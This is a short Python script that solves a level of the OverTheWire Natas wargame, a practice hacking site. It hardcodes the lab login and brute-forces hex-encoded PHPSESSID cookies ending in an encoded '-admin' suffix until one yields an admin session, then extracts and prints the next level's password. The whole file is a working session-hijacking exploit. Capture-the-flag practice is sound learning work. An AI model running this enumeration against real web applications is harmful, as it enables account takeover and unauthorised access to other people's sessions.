import requests
import itertools
import sys

url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"

admin_suffix = "d61646d696e"
prefix_lengths = [3,5,7]
max_id = 640

prefixes_to_try = []

## Length 3 prefixes
#for i in range(10):
	#prefixes_to_try.append(f"3{i}2")

#for a,b in itertools.combinations_with_replacement(range(10), 2):
#	prefixes_to_try.append(f"3{a}3{b}2")

#for a,b,c,d,e,f,g,h,i,k in itertools.combinations_with_replacement(range(10), 10):
	#prefixes_to_try.append(f"3{a}3{b}3{c}3{d}3{e}3{f}3{g}3{h}3{i}3{k}2")

not_found = True
count = int(sys.argv[1])
while count < int(sys.argv[1]) + int(sys.argv[2]):
	combinations = itertools.combinations_with_replacement(range(10), count)
	for combination in combinations:
		prefix = ""

		# Session start with 3? and repeat the same pattern
		for c in combination:
			prefix += f"3{c}"

		# Always finish with 2
		prefix += "2"
	
		session_id = f"{prefix}{admin_suffix}"
		r = requests.get(url, cookies={"PHPSESSID": session_id})

		invalid_session = "Please login" in r.text
		regular_user = "regular user" in r.text

		print(f"[{count}] Trying session id {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")

		if not regular_user and not invalid_session:
			print("Found valid session id !")
			print(r.text)
			password = r.text.split('Password: ')[1].split("</pre>")[0]
			print(f"Natas20 password is {password}")
			break

	count += 1
